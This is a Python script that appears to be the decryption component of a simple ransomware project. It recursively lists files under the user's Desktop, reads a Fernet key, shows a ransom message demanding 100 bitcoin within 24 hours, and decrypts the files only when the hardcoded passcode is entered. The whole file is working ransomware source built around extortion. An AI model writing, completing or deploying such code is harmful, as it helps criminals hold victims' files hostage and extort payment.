import os
from cryptography.fernet import Fernet

files = []

def filelist(path):
    for file in os.listdir(path):
        full_path = os.path.join(path, file)
        if file == "ransomware.py" or file == "thekey.key" or file == "decrypt.py":
            continue
        elif os.path.isfile(full_path):
            files.append((path, file))
        else:
            filelist(full_path)

# Provide the absolute path of the Desktop directory
root_directory = os.path.expanduser("~/Desktop")
filelist(root_directory)

with open("thekey.key", "rb") as f:
        mykey = f.read()

secret = "Iamadangeroushacker"
var = input("Enter the correct Passcode to Decrypt your files. The Passcode can only be achieved by sending 100 bitcoin in the next 24 hours.")
if var == secret:
        # the below for loop will decrypt all files.
        for path, file in files:
                full_path = os.path.join(path, file)
                with open(full_path, "rb") as f:
                        contents = f.read()
                decrypted_contents = Fernet(mykey).decrypt(contents)
                with open(full_path, "wb") as f:
                        f.write(decrypted_contents)
        print("Your Files have been successfully Decrypted!!! Enjoy :)")
else:
        print("Sorry, Wrong Passcode. Send more Bitcoin.:[ ")